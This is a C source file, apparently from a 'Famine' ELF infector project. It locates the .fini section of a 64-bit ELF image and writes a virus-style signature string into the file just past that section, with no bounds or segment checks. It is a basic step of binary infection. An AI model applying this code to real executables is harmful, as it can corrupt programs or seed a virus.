#include "famine.h"

Elf64_Off find_fini_offset_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_offset;
    }
    return 0;
}

Elf64_Addr find_fini_addr_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_addr;
    }
    return 0;
}

Elf64_Addr find_fini_size_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_size;
    }
    return 0;
}

int handle_64(unsigned char *file) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(file + ehdr->e_phoff);

    unsigned char payload[] = "Famine version 0.7 (c)oded jul-0064 by bob\n";
    size_t size_payload = strlen(payload);

    size_t injection_offset = find_fini_offset_64(file) + find_fini_size_64(file);

    memcpy(file + injection_offset, payload, size_payload);

    return 0;
}
